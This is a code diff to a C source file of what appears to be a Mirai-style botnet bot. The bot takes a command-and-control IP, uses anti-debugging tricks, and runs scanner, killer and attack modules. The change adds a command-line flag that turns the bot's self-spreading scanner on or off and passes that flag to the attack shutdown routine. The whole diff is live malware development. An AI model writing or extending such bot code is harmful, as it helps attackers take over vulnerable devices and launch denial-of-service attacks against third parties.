@@ -34,6 +34,7 @@ static BOOL unlock_tbl_if_nodebug(char *);
 struct sockaddr_in srv_addr;
 int fd_ctrl = -1, fd_serv = -1;
 char cncIpAddress[20];
+unsigned char enable_scanner = 0;
 BOOL pending_connection = FALSE;
 void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in anti_gdb_entry
 
@@ -47,18 +48,22 @@ static void segv_handler(int sig, siginfo_t *si, void *unused)
 
 int main(int argc, char **args)
 {
-    if (argc == 4) {
+    if (argc == 5) {
         util_strcpy(cncIpAddress, args[1]);
+        if (atoi(args[4]) == 1) {
+            enable_scanner = 1;
+        }
 #ifdef DEBUG
         printf("[main] number of arguments: %d\n", argc);
         printf("[main] cnc ip address (args[1]): %s\n", args[1]);
         printf("[main] local ip address (args[2]): %s\n", args[2]);
         printf("[main] callback ip address (args[3]): %s\n", args[3]);
+        printf("[main] enable scanner (args[4]): %s\n", args[4]);
 #endif
     } else {
 #ifdef DEBUG
         printf("[main] invalid number of arguments\n");
-        printf("[main] <cnc ip> <local ip> <callback ip>\n");
+        printf("[main] <cnc ip> <local ip> <callback ip> <enable scanner 0/1>\n");
         printf("[main] quitting\n");
         exit(-1);
 #endif
@@ -178,7 +183,9 @@ int main(int argc, char **args)
 #ifdef DEBUG
     printf("[main] starting scanner\n");
 #endif
-    scanner_init(args[2], args[3]);
+    if (enable_scanner) {
+        scanner_init(args[2], args[3]);
+    }
 #endif
 //#endif
 
@@ -244,7 +251,7 @@ int main(int argc, char **args)
             scanner_kill();
 #endif
             killer_kill();
-            attack_kill_all(args[2], args[3]);
+            attack_kill_all(args[2], args[3], enable_scanner);
             kill(pgid * -1, 9);
             exit(0);
         }
